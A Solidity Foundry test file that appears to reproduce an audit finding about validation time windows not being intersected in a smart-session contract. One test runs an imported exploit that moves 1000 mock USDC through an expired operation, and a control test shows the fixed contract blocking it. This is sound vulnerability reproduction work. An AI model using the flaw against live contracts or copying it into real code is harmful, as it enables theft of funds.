// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {
    Exploit,
    SmartSessionFixed,
    Usdc
} from "./42061-validationdata-not-always-intersected-properly-cantina-none.sol";

contract Finding42061Test is Test {
    function test_exploit_expired_userop_still_transfers() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.token().balanceOf(address(e)), 1_000_000_000, "1000 USDC moved");
        assertEq(e.token().balanceOf(address(e.session())), 0, "session paid");
        uint48 afterWord = uint48(e.session().lastVd() >> 208);
        assertEq(afterWord, 0, "open window kept");
        assertLt(block.timestamp, uint256(type(uint48).max), "userOp validAfter still ahead");
        emit log_named_uint("usdc_moved", e.token().balanceOf(address(e)));
        emit log_named_uint("kept_valid_after", afterWord);
        emit log_named_uint("block_timestamp", block.timestamp);
    }

    function test_control_intersects_and_blocks_the_transfer() public {
        Usdc token = new Usdc();
        SmartSessionFixed fixedSession = new SmartSessionFixed(token);
        token.mint(address(fixedSession), 1_000_000_000);

        vm.expectRevert(bytes("outside window"));
        fixedSession.execute(address(this), 1_000_000_000);

        assertEq(token.balanceOf(address(this)), 0, "nothing moved");
        assertEq(token.balanceOf(address(fixedSession)), 1_000_000_000, "1000 USDC stayed");
    }
}
